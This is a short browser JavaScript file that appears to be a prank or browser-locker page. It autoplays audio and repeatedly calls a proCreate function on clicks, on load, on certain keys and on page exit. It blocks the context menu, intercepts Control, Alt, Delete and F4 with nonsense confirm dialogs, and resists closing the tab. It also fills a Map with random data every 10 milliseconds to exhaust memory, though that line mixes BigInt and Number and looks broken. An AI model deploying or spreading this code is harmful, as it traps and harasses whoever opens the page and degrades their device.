let thing = new Map()

/** @type {HTMLAudioElement} */
let audio = document.querySelector('#audio')

audio.play()

document.addEventListener("click", async () => {
	await proCreate(1);
});

window.onload = async () => {
	playBall();
	setTimeout(async () => {
		await proCreate(1)
	}, 4000)
};

window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		const a = document.createElement('a')
		await proCreate(1);
		confirm("???????????????????????????????? /??????!?????????");
	}

	return null;
}
window.onbeforeunload = async () => {
	confirm('!!!!!!!!!""??"??$444$?$£*(*"*"')
	await proCreate(1);
}

setInterval(() => thing.set(`${Math.random() * 999999}`, `${Math.random() * 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999n}`), 10)